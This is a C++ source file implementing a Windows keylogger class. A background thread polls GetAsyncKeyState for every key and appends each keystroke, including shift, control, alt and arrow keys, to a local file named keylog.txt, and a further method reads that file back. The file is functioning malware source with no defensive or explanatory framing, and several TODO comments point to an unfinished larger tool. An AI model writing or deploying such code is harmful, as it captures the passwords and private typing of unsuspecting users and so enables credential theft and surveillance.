#include "KeyLogger.h"

#include <cstring>
#include <fstream>
#include <cstddef>
#include <thread>
#include <cctype>

#include <windows.h>

// TODO START STATE

KeyLogger::KeyLogger(): 
// buf(new char[kBufSize]), 
stop(true) { 	
}

KeyLogger::KeyLogger(const KeyLogger &o) {  
    // buf = new char[kBufSize];
    // memcpy(buf, o.buf, kBufSize);
}

KeyLogger::~KeyLogger() {
    // delete[] buf;
    // buf = NULL;
    fout.close();
}

void KeyLogger::log(std::string s) {
    fout << s;
    // TODO REMOVE 2 l
    fout.flush();
}

bool KeyLogger::logSpecialKey(int S_Key) {
	if (VK_F1 <= S_Key && S_Key <= VK_F24) {
		log("#F" + std::to_string(S_Key - VK_F1 + 1));
		return true;
	}

	switch (S_Key) {
	case VK_OEM_1:
		log(";");
		return true;
	case VK_OEM_PLUS:
		log("+");
		return true;
	case VK_OEM_COMMA:
		log(",");
		return true;
	case VK_OEM_MINUS:
		log("-");
		return true;
	case VK_OEM_2:
		log("/");
		return true;
	case VK_OEM_3:
		log("`");
		return true;
	case VK_OEM_4:
		log("[");
		return true;
	case VK_OEM_5:
		log("\\");
		return true;
	case VK_OEM_6:
		log("]");
		return true;
	case VK_OEM_7:
		log("'");
		return true;

    case VK_SPACE:
		log(" ");
		return true;
	case VK_RETURN:
		log("\n");
		return true;
	case VK_OEM_PERIOD:
		log(".");
		return true;
	case VK_LSHIFT:
	case VK_RSHIFT:
	case VK_SHIFT:
		log("#SHIFT");
		return true;
	case VK_BACK:
		log("#<-");
		return true;
	case VK_RBUTTON:
		log("#R_CLICK");
		return true;
	case VK_CAPITAL:
		log("#CAPS_LOCK");
		return true;
	case VK_TAB:
		log("#TAB");
		return true;
	case VK_UP:
		log("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		log("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		log("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		log("#RIGHT_ARROW_KEY");
		return true;
	case VK_LCONTROL:
	case VK_RCONTROL:
	case VK_CONTROL:
		log("#CONTROL");
		return true;
	case VK_LMENU:
	case VK_RMENU:
	case VK_MENU:
		log("#ALT");
		return true;
	default: 
		return false;
	}
}

KeyLogger& KeyLogger::operator=(const KeyLogger &o) {
    if (this == &o)
        return *this;

    // delete[] buf;
    // buf = new char[kBufSize];
    // memcpy(buf, o.buf, kBufSize);
    return *this;
}

// TODO MOUSE
void KeyLogger::startKeylogger() {
	if (!stop)
		return;

    fout = std::ofstream("keylog.txt", std::fstream::out);
    if (!fout.good()) {
        std::cout << "error creating keylogger file\n";
        // TODO NOTIFY
    }
    fout.close();
    fout.clear();
    fout.open("keylog.txt", std::fstream::app);
    
    auto keylog = [](KeyLogger *keylogger2) {
        KeyLogger& keylogger = *keylogger2;
        while (!keylogger.stop) {
            for (int key = 0x08; key <= 0xDE; ++key) {
                if (GetAsyncKeyState(key) == -32767) {
                    if (!keylogger.logSpecialKey(key)) {
						char c = key;
						if (std::isalpha(c))
							c = std::tolower(c);
						
						if (0x30 <= c && c <= 0x7E)
                        	keylogger.log(std::string("") + c);
                    }
                }
            }
        }
    };
    stop = false;
    logThread = std::thread(keylog, this);	
}

void KeyLogger::stopKeylogger() {
	if (stop)
		return;	

    stop = true;
    fout.close();
	logThread.join();
}

std::ifstream KeyLogger::getLoggingStream() {
    return std::ifstream("keylog.txt");
}
